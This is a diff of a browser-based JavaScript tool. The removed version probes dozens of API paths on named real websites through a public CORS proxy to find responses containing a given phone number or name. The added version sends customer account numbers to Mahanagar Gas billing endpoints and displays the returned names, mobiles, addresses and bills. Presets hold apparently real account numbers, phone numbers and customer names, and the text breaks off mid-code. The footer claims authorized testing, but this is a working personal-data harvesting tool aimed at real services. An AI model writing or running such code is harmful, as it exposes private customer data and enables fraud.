@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>🎯 Smart Targeted Data Leak Scanner</title>
+    <title>🔍 Mahanagar Gas – Live Data Fetcher</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet" />
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
     <style>
@@ -18,9 +18,9 @@
         ::-webkit-scrollbar { width: 5px; height: 5px; }
         ::-webkit-scrollbar-track { background: #0d1520; border-radius: 10px; }
         ::-webkit-scrollbar-thumb { background: #1e2d4a; border-radius: 10px; }
-        ::-webkit-scrollbar-thumb:hover { background: #22c55e; }
+        ::-webkit-scrollbar-thumb:hover { background: #f59e0b; }
 
-        .container { max-width: 1300px; margin: 0 auto; }
+        .container { max-width: 1200px; margin: 0 auto; }
 
         .header {
             display: flex;
@@ -35,16 +35,16 @@
         .brand { display: flex; align-items: center; gap: 14px; }
         .brand-icon {
             width: 44px; height: 44px;
-            background: linear-gradient(135deg, #22c55e, #16a34a);
+            background: linear-gradient(135deg, #f59e0b, #d97706);
             border-radius: 12px;
             display: flex;
             align-items: center;
             justify-content: center;
             font-size: 20px;
-            box-shadow: 0 0 30px rgba(34,197,94,0.15);
+            box-shadow: 0 0 30px rgba(245,158,11,0.15);
         }
         .brand h1 { font-size: 20px; font-weight: 800; }
-        .brand h1 span { color: #22c55e; }
+        .brand h1 span { color: #f59e0b; }
         .brand small { display: block; font-size: 11px; color: #64748b; }
 
         .badge {
@@ -97,11 +97,11 @@
 
         .input-grid {
             display: grid;
-            grid-template-columns: 1fr 1fr 1fr 1fr;
+            grid-template-columns: 1fr 1fr 1fr;
             gap: 12px;
         }
-        @media (max-width: 1000px) { .input-grid { grid-template-columns: 1fr 1fr; } }
-        @media (max-width: 600px) { .input-grid { grid-template-columns: 1fr; } }
+        @media (max-width: 800px) { .input-grid { grid-template-columns: 1fr 1fr; } }
+        @media (max-width: 500px) { .input-grid { grid-template-columns: 1fr; } }
 
         .field { position: relative; }
         .field i {
@@ -111,7 +111,7 @@
             transform: translateY(-50%);
             color: #64748b;
         }
-        .field input, .field select {
+        .field input {
             width: 100%;
             padding: 14px 14px 14px 44px;
             background: #060b18;
@@ -123,11 +123,10 @@
             outline: none;
             transition: all 0.3s;
         }
-        .field input:focus, .field select:focus {
-            border-color: #22c55e;
-            box-shadow: 0 0 0 4px rgba(34,197,94,0.12);
+        .field input:focus {
+            border-color: #f59e0b;
+            box-shadow: 0 0 0 4px rgba(245,158,11,0.12);
         }
-        .field select option { background: #0f172a; }
 
         .btn {
             padding: 14px 24px;
@@ -142,16 +141,15 @@
             align-items: center;
             gap: 8px;
             justify-content: center;
-            white-space: nowrap;
         }
         .btn-primary {
-            background: linear-gradient(135deg, #22c55e, #16a34a);
+            background: linear-gradient(135deg, #f59e0b, #d97706);
             color: #fff;
-            box-shadow: 0 4px 20px rgba(34,197,94,0.18);
+            box-shadow: 0 4px 20px rgba(245,158,11,0.18);
         }
         .btn-primary:hover:not(:disabled) {
             transform: translateY(-2px);
-            box-shadow: 0 8px 30px rgba(34,197,94,0.25);
+            box-shadow: 0 8px 30px rgba(245,158,11,0.25);
         }
         .btn-primary:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
         .btn-secondary {
@@ -160,10 +158,6 @@
             border: 1px solid #1e2d4a;
         }
         .btn-secondary:hover { background: #1e2d4a; color: #eef2ff; }
-        .btn-danger {
-            background: linear-gradient(135deg, #ef4444, #dc2626);
-            color: #fff;
-        }
 
         .flex-row { display: flex; gap: 12px; flex-wrap: wrap; margin-top: 16px; }
 
@@ -177,142 +171,7 @@
         #status.info { background: #0d1a2b; border: 1px solid #3b82f6; color: #3b82f6; display: block; }
         #status.success { background: #0d1c0d; border: 1px solid #22c55e; color: #22c55e; display: block; }
         #status.error { background: #1c0d0d; border: 1px solid #ef4444; color: #ef4444; display: block; }
-        #status.warning { background: #1c1a0d; border: 1px solid #eab308; color: #eab308; display: block; }
-
-        .stat-box {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
-            gap: 10px;
-            margin: 12px 0;
-            display: none;
-        }
-        .stat-item {
-            background: #0d1520;
-            border: 1px solid #1a2744;
-            border-radius: 8px;
-            padding: 10px 14px;
-            text-align: center;
-        }
-        .stat-item .num { font-size: 22px; font-weight: 800; }
-        .stat-item .label { font-size: 11px; color: #64748b; }
-        .stat-item .num.found { color: #22c55e; }
-        .stat-item .num.total { color: #f59e0b; }
-        .stat-item .num.matched { color: #ef4444; }
-
-        .progress-wrap { display: none; margin: 12px 0; }
-        .progress-bar {
-            width: 100%;
-            height: 6px;
-            background: #0d1520;
-            border-radius: 10px;
-            overflow: hidden;
-        }
-        .progress-bar .fill {
-            height: 100%;
-            width: 0%;
-            background: linear-gradient(90deg, #f59e0b, #22c55e);
-            border-radius: 10px;
-            transition: width 0.3s;
-        }
-        .progress-text {
-            display: flex;
-            justify-content: space-between;
-            font-size: 12px;
-            color: #64748b;
-            margin-top: 4px;
-        }
-
-        /* ─── MATCH RESULTS ─── */
-        .match-results {
-            display: none;
-            margin-top: 16px;
-        }
-        .match-item {
-            background: #0d1520;
-            border: 1px solid #1a2744;
-            border-radius: 10px;
-            padding: 14px 18px;
-            margin-bottom: 10px;
-            border-left: 4px solid #22c55e;
-        }
-        .match-item .match-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            flex-wrap: wrap;
-            gap: 8px;
-        }
-        .match-item .match-method {
-            font-size: 11px;
-            font-weight: 700;
-            padding: 2px 10px;
-            border-radius: 50px;
-        }
-        .match-item .match-method.get { background: #0d1a2b; color: #3b82f6; border: 1px solid #3b82f6; }
-        .match-item .match-method.post { background: #1c1a0d; color: #eab308; border: 1px solid #eab308; }
-        .match-item .match-url {
-            font-family: 'Courier New', monospace;
-            font-size: 13px;
-            color: #94a3b8;
-            flex: 1;
-            padding: 0 10px;
-            word-break: break-all;
-        }
-        .match-item .match-badge {
-            font-size: 11px;
-            padding: 2px 12px;
-            border-radius: 50px;
-            background: #1c0d0d;
-            color: #ef4444;
-            border: 1px solid #ef4444;
-        }
-
-        .match-item .match-details {
-            margin-top: 12px;
-            padding-top: 12px;
-            border-top: 1px solid #1a2744;
-        }
-
-        .match-item .match-fields {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 6px;
-            margin-top: 8px;
-        }
-        @media (max-width: 600px) { .match-item .match-fields { grid-template-columns: 1fr; } }
-
-        .match-item .field-box {
-            display: flex;
-            justify-content: space-between;
-            padding: 6px 12px;
-            background: #060b18;
-            border-radius: 6px;
-            border: 1px solid #0d1520;
-        }
-        .match-item .field-box .label { color: #64748b; font-size: 12px; }
-        .match-item .field-box .value { color: #22c55e; font-weight: 600; font-size: 13px; }
-
-        .match-item .response-box {
-            background: #060b18;
-            border-radius: 6px;
-            padding: 12px;
-            font-family: 'JetBrains Mono', monospace;
-            font-size: 12px;
-            color: #94a3b8;
-            white-space: pre-wrap;
-            word-break: break-all;
-            max-height: 300px;
-            overflow-y: auto;
-            border: 1px solid #0d1520;
-            margin-top: 8px;
-        }
-        .match-item .response-box .highlight {
-            background: #1c0d0d;
-            color: #ef4444;
-            padding: 1px 4px;
-            border-radius: 3px;
-            border: 1px solid #ef4444;
-        }
+        #status.warning { background: #1c1a0d; border: 1px solid #f59e0b; color: #f59e0b; display: block; }
 
         .log-area {
             background: #060b18;
@@ -332,18 +191,113 @@
         .log-area .success { color: #22c55e; }
         .log-area .error { color: #ef4444; }
         .log-area .info { color: #3b82f6; }
-        .log-area .warning { color: #eab308; }
+        .log-area .warning { color: #f59e0b; }
 
         .spinner {
             display: inline-block;
             width: 18px;
             height: 18px;
             border: 2px solid #1a2744;
-            border-top-color: #22c55e;
+            border-top-color: #f59e0b;
             border-radius: 50%;
             animation: spin 0.7s linear infinite;
         }
         @keyframes spin { to { transform: rotate(360deg); } }
+
+        /* ─── RESULT CARD ─── */
+        #result {
+            display: none;
+            margin-top: 16px;
+        }
+
+        .result-card {
+            background: #0d1520;
+            border-radius: 12px;
+            border: 1px solid #1a2744;
+            overflow: hidden;
+        }
+
+        .result-header {
+            padding: 16px 20px;
+            background: #1c0d0d;
+            border-bottom: 1px solid #ef4444;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 10px;
+        }
+        .result-header .title {
+            color: #ef4444;
+            font-weight: 700;
+            font-size: 18px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .result-header .badge-risk {
+            background: #ef4444;
+            color: #fff;
+            padding: 4px 16px;
+            border-radius: 50px;
+            font-size: 12px;
+            font-weight: 600;
+        }
+
+        .result-body { padding: 20px; }
+
+        .result-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 8px;
+        }
+        @media (max-width: 600px) { .result-grid { grid-template-columns: 1fr; } }
+
+        .result-item {
+            display: flex;
+            justify-content: space-between;
+            padding: 10px 16px;
+            background: #060b18;
+            border-radius: 8px;
+            border: 1px solid #0d1520;
+            align-items: center;
+        }
+        .result-item .label {
+            color: #8b949e;
+            font-size: 13px;
+            font-weight: 500;
+        }
+        .result-item .value {
+            color: #eef2ff;
+            font-weight: 600;
+            font-size: 14px;
+            text-align: right;
+            word-break: break-all;
+        }
+        .result-item .value.leak { color: #ef4444; }
+        .result-item .value.safe { color: #22c55e; }
+
+        .response-box {
+            background: #060b18;
+            border-radius: 8px;
+            padding: 16px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 12px;
+            color: #94a3b8;
+            white-space: pre-wrap;
+            word-break: break-all;
+            max-height: 300px;
+            overflow-y: auto;
+            border: 1px solid #0d1520;
+            margin-top: 16px;
+        }
+        .response-box .highlight {
+            background: #1c0d0d;
+            color: #ef4444;
+            padding: 1px 4px;
+            border-radius: 3px;
+            border: 1px solid #ef4444;
+        }
 
         .footer {
             margin-top: 28px;
@@ -376,7 +330,7 @@
             transition: all 0.2s;
         }
         .preset-buttons button:hover {
-            border-color: #22c55e;
+            border-color: #f59e0b;
             color: #eef2ff;
         }
 
@@ -397,14 +351,6 @@
             pointer-events: none;
         }
         .toast.show { opacity: 1; transform: translateY(0); }
-
-        .no-match {
-            text-align: center;
-            padding: 30px;
-            color: #64748b;
-        }
-        .no-match i { font-size: 48px; display: block; margin-bottom: 12px; color: #1a2744; }
-        .no-match h3 { color: #94a3b8; font-weight: 400; }
     </style>
 </head>
 <body>
@@ -414,56 +360,51 @@
     <!-- ─── HEADER ─── -->
     <div class="header">
         <div class="brand">
-            <div class="brand-icon"><i class="fas fa-bullseye"></i></div>
+            <div class="brand-icon"><i class="fas fa-fire"></i></div>
             <div>
-                <h1>Target<span>Scan</span></h1>
-                <small>Exact Match Data Leak Finder</small>
+                <h1>MGL<span>Data</span></h1>
+                <small>Live Data Fetcher – Mahanagar Gas</small>
             </div>
         </div>
         <div class="badge">
             <span class="dot"></span>
-            <span>Smart Matching</span>
+            <span>Live API</span>
         </div>
     </div>
 
     <!-- ─── MAIN CARD ─── -->
     <div class="card">
         <div class="card-header">
-            <h2><i class="fas fa-search" style="color:#22c55e;"></i> Enter Website + Target Data</h2>
-            <span style="color:#64748b;font-size:12px;">Scans ALL APIs and shows only matching results</span>
+            <h2><i class="fas fa-search" style="color:#f59e0b;"></i> Fetch Customer Data</h2>
+            <span style="color:#64748b;font-size:12px;">Enter BP or CA Number</span>
         </div>
         <div class="card-body">
 
-            <!-- ─── INPUT GRID ─── -->
             <div class="input-grid">
                 <div class="field">
-                    <i class="fas fa-globe"></i>
-                    <input type="text" id="targetUrl" placeholder="Website URL" value="https://paynearby.in" />
-                </div>
-                <div class="field">
                     <i class="fas fa-hashtag"></i>
-                    <input type="text" id="testParam" placeholder="Parameter (e.g. mobile)" value="mobile" />
+                    <input type="text" id="bpInput" placeholder="BP Number" value="1100081082" />
                 </div>
                 <div class="field">
-                    <i class="fas fa-phone"></i>
-                    <input type="text" id="searchMobile" placeholder="Mobile Number to find" value="8809559017" />
+                    <i class="fas fa-id-card"></i>
+                    <input type="text" id="caInput" placeholder="CA Number" value="210000334310" />
                 </div>
                 <div class="field">
-                    <i class="fas fa-user"></i>
-                    <input type="text" id="searchName" placeholder="Name to find (optional)" value="" />
+                    <i class="fas fa-file-invoice"></i>
+                    <input type="text" id="billInput" placeholder="Bill Number (optional)" value="203012339054" />
                 </div>
             </div>
 
             <div class="preset-buttons">
-                <span style="color:#64748b;font-size:12px;margin-right:6px;">Presets:</span>
-                <button onclick="setPreset('paynearby')">PayNearby</button>
-                <button onclick="setPreset('mgl')">MGL</button>
-                <button onclick="setPreset('mobile')">Mobile Only</button>
+                <span style="color:#64748b;font-size:12px;margin-right:6px;">Quick:</span>
+                <button onclick="setData('1100081082','210000334310','203012339054')">MEHTA DILIP</button>
+                <button onclick="setData('50246713','','')">Test BP</button>
+                <button onclick="setData('','210000334311','')">Test CA</button>
             </div>
 
             <div class="flex-row">
-                <button class="btn btn-primary" id="scanBtn" style="flex:1;">
-                    <i class="fas fa-radar"></i> Find Data Leaks
+                <button class="btn btn-primary" id="fetchBtn" style="flex:1;">
+                    <i class="fas fa-download"></i> Fetch Data
                 </button>
                 <button class="btn btn-secondary" onclick="clearAll()">
                     <i class="fas fa-times"></i> Clear
@@ -471,29 +412,14 @@
             </div>
 
             <div id="status"></div>
-
-            <div class="progress-wrap" id="progressWrap">
-                <div class="progress-bar"><div class="fill" id="progressFill"></div></div>
-                <div class="progress-text">
-                    <span id="progressLabel">0 / 0</span>
-                    <span id="progressPercent">0%</span>
-                </div>
-            </div>
-
-            <div class="stat-box" id="statBox">
-                <div class="stat-item"><div class="num total" id="statTotal">0</div><div class="label">Total APIs</div></div>
-                <div class="stat-item"><div class="num found" id="statFound">0</div><div class="label">Data Leaks</div></div>
-                <div class="stat-item"><div class="num matched" id="statMatched">0</div><div class="label">Matches Found</div></div>
-            </div>
-
-            <div class="match-results" id="matchResults"></div>
+            <div id="result"></div>
             <div class="log-area" id="logArea"></div>
 
         </div>
     </div>
 
     <div class="footer">
-        <span><span class="warn">⚠️</span> Shows only APIs where your search data matches</span>
+        <span><span class="warn">⚠️</span> Fetches live data from Mahanagar Gas API</span>
         <span>For authorized security testing only</span>
     </div>
 </div>
@@ -502,45 +428,21 @@
 
 <script>
     // ─── DOM ───
-    const targetUrl = document.getElementById('targetUrl');
-    const testParam = document.getElementById('testParam');
-    const searchMobile = document.getElementById('searchMobile');
-    const searchName = document.getElementById('searchName');
-    const scanBtn = document.getElementById('scanBtn');
+    const bpInput = document.getElementById('bpInput');
+    const caInput = document.getElementById('caInput');
+    const billInput = document.getElementById('billInput');
+    const fetchBtn = document.getElementById('fetchBtn');
     const statusDiv = document.getElementById('status');
     const logArea = document.getElementById('logArea');
-    const matchResults = document.getElementById('matchResults');
-    const progressWrap = document.getElementById('progressWrap');
-    const progressFill = document.getElementById('progressFill');
-    const progressLabel = document.getElementById('progressLabel');
-    const progressPercent = document.getElementById('progressPercent');
-    const statBox = document.getElementById('statBox');
-    const statTotal = document.getElementById('statTotal');
-    const statFound = document.getElementById('statFound');
-    const statMatched = document.getElementById('statMatched');
-
-    let discoveredApis = [];
-    let isRunning = false;
+    const resultDiv = document.getElementById('result');
 
     // ─── PRESETS ───
-    function setPreset(type) {
-        if (type === 'paynearby') {
-            targetUrl.value = 'https://paynearby.in';
-            testParam.value = 'mobile';
-            searchMobile.value = '8809559017';
-            searchName.value = '';
-        } else if (type === 'mgl') {
-            targetUrl.value = 'https://www.mahanagargas.com';
-            testParam.value = 'bpNumber';
-            searchMobile.value = '7505757889';
-            searchName.value = 'SHAMA PATHAK';
-        } else if (type === 'mobile') {
-            targetUrl.value = 'https://www.mahanagargas.com';
-            testParam.value = 'mobile';
-            searchMobile.value = '7505757889';
-            searchName.value = '';
-        }
+    function setData(bp, ca, bill) {
+        bpInput.value = bp;
+        caInput.value = ca;
+        billInput.value = bill || '';
         clearAll();
+        setTimeout(() => fetchBtn.click(), 300);
     }
 
     // ─── LOG ───
@@ -562,12 +464,9 @@
     function clearAll() {
         logArea.innerHTML = '';
         logArea.style.display = 'none';
-        matchResults.innerHTML = '';
-        matchResults.style.display = 'none';
-        statBox.style.display = 'none';
-        progressWrap.style.display = 'none';
+        resultDiv.innerHTML = '';
+        resultDiv.style.display = 'none';
         statusDiv.style.display = 'none';
-        discoveredApis = [];
     }
 
     function showToast(msg) {
@@ -585,250 +484,240 @@
         return div.innerHTML;
     }
 
-    // ─── DISCOVER APIS ───
-    async function discoverApis(url) {
-        const apis = [];
-        const paths = [
-            '', '/api', '/api/v1', '/api/v2', '/api/v3',
-            '/ajax', '/ajax/get', '/ajax/post', '/ajax/details',
-            '/rest', '/rest/v1',
-            '/get', '/post', '/details', '/info', '/data',
-            '/customer', '/user', '/order', '/bill', '/payment',
-            '/mobile', '/email', '/profile', '/account',
-            '/service', '/services', '/product', '/products',
-            '/invoice', '/usage', '/history', '/statement',
-            '/view', '/show', '/fetch', '/retrieve',
-            '/v1', '/v2', '/v3'
+    // ─── FORMAT CURRENCY ───
+    function fmt(num) {
+        if (!num) return '0.00';
+        return parseFloat(num).toFixed(2);
+    }
+
+    // ─── DETECT LEAK ───
+    function detectLeak(text) {
+        const leaks = [];
+        const patterns = [
+            { type: '📱 Mobile', regex: /[6-9][0-9]{9}/g },
+            { type: '📧 Email', regex: /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g },
+            { type: '📍 Address', regex: /(?:maharashtra|mumbai|pune|delhi|bangalore|chennai|kolkata|hyderabad|road|street|building|flat|society|colony|nagar|chowk)/gi },
+            { type: '👤 Name', regex: /(?:mr\.|ms\.|mrs\.|dr\.|shri|smt)\.?\s+[a-z]{2,}/gi },
+            { type: '🆔 Aadhar', regex: /[2-9][0-9]{11}/g },
+            { type: '📄 PAN', regex: /[A-Z]{5}[0-9]{4}[A-Z]{1}/g },
+            { type: '🏠 PIN', regex: /\b[1-9][0-9]{5}\b/g }
         ];
-        const methods = ['GET', 'POST'];
-
-        log(`🔍 Discovering APIs on: ${url}`, 'info');
-
-        for (const path of paths) {
-            for (const method of methods) {
-                const fullUrl = url + path;
-                try {
-                    const proxy = 'https://corsproxy.io/?';
-                    const test = 'test_' + Date.now();
-                    let response;
-                    if (method === 'GET') {
-                        response = await fetch(proxy + encodeURIComponent(fullUrl + '?test=' + test), { signal: AbortSignal.timeout(3000) });
-                    } else {
-                        const fd = new URLSearchParams();
-                        fd.append('test', test);
-                        response = await fetch(proxy + encodeURIComponent(fullUrl), {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-                            body: fd.toString(),
-                            signal: AbortSignal.timeout(3000)
-                        });
-                    }
-                    if (response.status === 200 || response.status === 404) {
-                        const text = await response.text();
-                        const isJson = text.trim().startsWith('{') || text.trim().startsWith('[');
-                        const hasData = text.length > 30 && (text.includes('{') || text.includes('[') || text.includes('html'));
-                        if (isJson || hasData) {
-                            apis.push({
-                                url: fullUrl,
-                                method: method,
-                                status: 'pending',
-                                response: text.substring(0, 500),
-                                fullResponse: text
-                            });
-                            log(`✅ Found: ${method} ${fullUrl}`, 'success');
-                        }
-                    }
-                } catch (e) { /* Silent */ }
+        for (const p of patterns) {
+            let match;
+            while ((match = p.regex.exec(text)) !== null) {
+                if (match[0]) {
+                    leaks.push({ type: p.type, value: match[0] });
+                }
             }
         }
-
         const unique = [];
         const seen = new Set();
-        for (const api of apis) {
-            const key = api.url + api.method;
-            if (!seen.has(key)) { seen.add(key); unique.push(api); }
+        for (const l of leaks) {
+            const key = l.type + l.value;
+            if (!seen.has(key)) { seen.add(key); unique.push(l); }
         }
         return unique;
     }
 
-    // ─── TEST API ───
-    async function testApi(api, param, value) {
-        try {
-            const proxy = 'https://corsproxy.io/?';
-            let response;
-            if (api.method === 'GET') {
-                const sep = api.url.includes('?') ? '&' : '?';
-                response = await fetch(proxy + encodeURIComponent(api.url + sep + param + '=' + value), {
-                    signal: AbortSignal.timeout(5000)
-                });
-            } else {
-                const fd = new URLSearchParams();
-                fd.append(param, value);
-                response = await fetch(proxy + encodeURIComponent(api.url), {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-                    body: fd.toString(),
-                    signal: AbortSignal.timeout(5000)
-                });
-            }
-            const text = await response.text();
-            return { status: response.status, response: text };
-        } catch (e) {
-            return { status: 0, response: `Error: ${e.message}` };
+    // ─── BUILD RESULT ───
+    function buildResult(data, responseText, leaks, searchParams) {
+        const hasLeak = leaks.length > 0;
+        const d = data.response || data;
+
+        // Extract fields
+        const fields = [
+            { label: '👤 Customer Name', key: 'full_name', value: d.full_name, leak: true },
+            { label: '📱 Mobile', key: 'mobile', value: d.mobile, leak: true },
+            { label: '📍 Location', key: 'location', value: d.location, leak: true },
+            { label: '🏠 House Number', key: 'house_number', value: d.house_number, leak: true },
+            { label: '🏙️ City', key: 'city', value: d.city, leak: true },
+            { label: '📮 Postal Code', key: 'postal_code', value: d.postal_code, leak: true },
+            { label: '📋 BP Number', key: 'bp_number', value: d.bp_number, leak: false },
+            { label: '🆔 CA Number', key: 'ca_number', value: d.ca_number || d.bp_master_id, leak: false },
+            { label: '🧾 Bill Number', key: 'bill_number', value: d.bill_number, leak: false },
+            { label: '📅 Bill Date', key: 'document_date', value: d.document_date, leak: false },
+            { label: '📅 Due Date', key: 'due_date', value: d.due_date, leak: false },
+            { label: '💰 Total Bill', key: 'total_bil_amount', value: d.total_bil_amount, leak: false },
+            { label: '💵 Amount to Pay', key: 'amount_to_be_paid', value: d.amount_to_be_paid, leak: false },
+            { label: '📊 Consumption', key: 'consumption', value: d.consumption, leak: false },
+        ];
+
+        let itemsHTML = fields
+            .filter(f => f.value)
+            .map(f => `
+                <div class="result-item">
+                    <span class="label">${f.label}</span>
+                    <span class="value ${f.leak ? 'leak' : 'safe'}">${escapeHtml(f.value)}</span>
+                </div>
+            `).join('');
+
+        // Leak summary
+        let leakHTML = '';
+        if (hasLeak) {
+            leakHTML = `
+                <div style="background:#1c0d0d;border:1px solid #ef4444;border-radius:8px;padding:12px 16px;margin-bottom:16px;">
+                    <strong style="color:#ef4444;">🔴 ${leaks.length} Data Leak${leaks.length > 1 ? 's' : ''} Detected!</strong>
+                    <div style="color:#8b949e;font-size:13px;margin-top:4px;">
+                        Personal data exposed: ${leaks.map(l => `${l.type}: ${escapeHtml(l.value)}`).join(' | ')}
+                    </div>
+                </div>
+            `;
         }
+
+        return `
+            <div class="result-card">
+                <div class="result-header">
+                    <div class="title">
+                        <i class="fas fa-user-circle"></i>
+                        ${d.full_name || 'Customer Data'}
+                    </div>
+                    <span class="badge-risk">${hasLeak ? '⚠️ LEAK' : '🔒 SECURE'}</span>
+                </div>
+                <div class="result-body">
+                    ${leakHTML}
+                    <div class="result-grid">${itemsHTML}</div>
+                    <details style="margin-top:16px;">
+                        <summary style="cursor:pointer;color:#64748b;font-size:13px;">
+                            <i class="fas fa-code"></i> View Raw API Response
+                        </summary>
+                        <div class="response-box">${escapeHtml(responseText || 'No response')}</div>
+                    </details>
+                </div>
+            </div>
+        `;
     }
 
-    // ─── CHECK MATCH ───
-    function checkMatch(response, mobile, name) {
-        const matches = [];
-        // Check mobile
-        if (mobile && response.includes(mobile)) {
-            matches.push({ type: '📱 Mobile', value: mobile });
+    // ─── MAIN FETCH ───
+    document.getElementById('fetchBtn').addEventListener('click', async function() {
+        const bp = bpInput.value.trim();
+        const ca = caInput.value.trim();
+        const bill = billInput.value.trim();
+
+        if (!bp && !ca) {
+            setStatus('⚠️ Please enter BP Number or CA Number', 'warning');
+            return;
         }
-        // Check name
-        if (name && name.trim() && response.toLowerCase().includes(name.toLowerCase().trim())) {
-            matches.push({ type: '👤 Name', value: name });
-        }
-        return matches;
-    }
 
-    // ─── MAIN SCAN ───
-    document.getElementById('scanBtn').addEventListener('click', async function() {
-        if (isRunning) return;
-
-        const url = targetUrl.value.trim();
-        const param = testParam.value.trim();
-        const mobile = searchMobile.value.trim();
-        const name = searchName.value.trim();
-
-        if (!url) { setStatus('⚠️ Please enter a URL', 'warning'); return; }
-        if (!param) { setStatus('⚠️ Please enter a parameter', 'warning'); return; }
-        if (!mobile && !name) { setStatus('⚠️ Please enter a mobile number or name to search', 'warning'); return; }
-
-        let cleanUrl = url;
-        if (!cleanUrl.startsWith('http://') && !cleanUrl.startsWith('https://')) {
-            cleanUrl = 'https://' + cleanUrl;
-        }
-        if (cleanUrl.endsWith('/')) cleanUrl = cleanUrl.slice(0, -1);
-
-        isRunning = true;
         this.disabled = true;
-        this.innerHTML = `<span class="spinner"></span> Searching...`;
+        this.innerHTML = `<span class="spinner"></span> Fetching...`;
         clearAll();
 
-        const searchDesc = `${mobile || ''}${mobile && name ? ' & ' : ''}${name || ''}`;
-        setStatus(`⏳ Searching for "${searchDesc}" in all APIs on ${cleanUrl}...`, 'info');
-        log(`🚀 Starting targeted scan on: ${cleanUrl}`, 'info');
-        log(`📌 Searching for: ${searchDesc}`, 'info');
+        setStatus(`⏳ Fetching data from MGL API...`, 'info');
+        log(`🚀 Fetching data for BP: ${bp || 'N/A'}, CA: ${ca || 'N/A'}`, 'info');
 
         try {
-            // ─── DISCOVER ───
-            discoveredApis = await discoverApis(cleanUrl);
-            log(`✅ Discovered ${discoveredApis.length} APIs`, 'success');
+            const proxy = 'https://corsproxy.io/?';
+            const targetUrl = 'https://www.mahanagargas.com/ajax/get-billing-details';
+            // Try multiple possible endpoints
+            const endpoints = [
+                'https://www.mahanagargas.com/ajax/get-billing-details',
+                'https://www.mahanagargas.com/api/get-billing-details',
+                'https://www.mahanagargas.com/get-billing-details'
+            ];
 
-            if (discoveredApis.length === 0) {
-                setStatus('⚠️ No APIs discovered. Try a different URL.', 'warning');
-                isRunning = false;
+            let responseText = '';
+            let success = false;
+            let statusCode = 0;
+
+            const params = new URLSearchParams();
+            if (bp) params.append('bpNumber', bp);
+            if (bp) params.append('bp', bp);
+            if (ca) params.append('caNumber', ca);
+            if (ca) params.append('ca', ca);
+            if (bill) params.append('billNumber', bill);
+
+            for (const url of endpoints) {
+                try {
+                    const response = await fetch(proxy + encodeURIComponent(url), {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                        body: params.toString(),
+                        signal: AbortSignal.timeout(8000)
+                    });
+                    statusCode = response.status;
+                    responseText = await response.text();
+                    if (response.status === 200) {
+                        success = true;
+                        log(`✅ Success: ${url}`, 'success');
+                        break;
+                    }
+                } catch (e) {
+                    log(`⚠️ Failed: ${url} - ${e.message}`, 'warning');
+                }
+            }
+
+            if (!success || !responseText) {
+                setStatus('❌ No data found. Check BP/CA number.', 'error');
+                log(`❌ No data received for BP: ${bp || 'N/A'}, CA: ${ca || 'N/A'}`, 'error');
                 this.disabled = false;
-                this.innerHTML = '<i class="fas fa-radar"></i> Find Data Leaks';
+                this.innerHTML = '<i class="fas fa-download"></i> Fetch Data';
                 return;
             }
 
-            progressWrap.style.display = 'block';
-            statBox.style.display = 'grid';
-            statTotal.textContent = discoveredApis.length;
-
-            let matchCount = 0;
-            let foundLeaks = 0;
-            const matchedResults = [];
-
-            // ─── TEST EACH API ───
-            for (let i = 0; i < discoveredApis.length; i++) {
-                const api = discoveredApis[i];
-                const result = await testApi(api, param, mobile || 'test');
-                api.fullResponse = result.response;
-
-                const matches = checkMatch(result.response, mobile, name);
-
-                if (matches.length > 0) {
-                    matchCount++;
-                    foundLeaks += matches.length;
-                    matchedResults.push({
-                        api: api,
-                        matches: matches,
-                        response: result.response
-                    });
-                    log(`🔴 MATCH FOUND: ${api.method} ${api.url} (${matches.length} matches)`, 'error');
-                } else {
-                    log(`🟢 No match: ${api.method} ${api.url}`, 'success');
+            // ─── Parse JSON ───
+            let json = null;
+            try {
+                json = JSON.parse(responseText);
+            } catch (e) {
+                // Try to find JSON in response
+                const match = responseText.match(/\{.*\}/s);
+                if (match) {
+                    try {
+                        json = JSON.parse(match[0]);
+                    } catch (e2) {}
                 }
-
-                const pct = Math.round(((i + 1) / discoveredApis.length) * 100);
-                progressFill.style.width = pct + '%';
-                progressLabel.textContent = `${i + 1} / ${discoveredApis.length}`;
-                progressPercent.textContent = pct + '%';
-
-                statFound.textContent = foundLeaks;
-                statMatched.textContent = matchCount;
             }
 
-            // ─── DISPLAY MATCH RESULTS ───
-            if (matchedResults.length > 0) {
-                let html = '';
-                matchedResults.forEach((item, idx) => {
-                    const api = item.api;
-                    const matches = item.matches;
-                    const response = item.response;
+            // ─── Detect Leaks ───
+            const leaks = detectLeak(responseText);
 
-                    html += `
-                        <div class="match-item">
-                            <div class="match-header">
-                                <span class="match-method ${api.method.toLowerCase()}">${api.method}</span>
-                                <span class="match-url">${escapeHtml(api.url)}</span>
-                                <span class="match-badge">${matches.length} Match${matches.length > 1 ? 'es' : ''}</span>
+            // ─── Display Result ───
+            if (json && json.response) {
+                resultDiv.innerHTML = buildResult(json, responseText, leaks, { bp, ca, bill });
+                setStatus(`✅ Data found! ${leaks.length > 0 ? '🔴 ' + leaks.length + ' leaks detected' : '🔒 No leaks'}`, leaks.length > 0 ? 'error' : 'success');
+            } else if (json && json.status === 200) {
+                resultDiv.innerHTML = buildResult(json, responseText, leaks, { bp, ca, bill });
+                setStatus(`✅ Data found! ${leaks.length > 0 ? '🔴 ' + leaks.length + ' leaks detected' : '🔒 No leaks'}`, leaks.length > 0 ? 'error' : 'success');
+            } else {
+                // Try to extract data from HTML
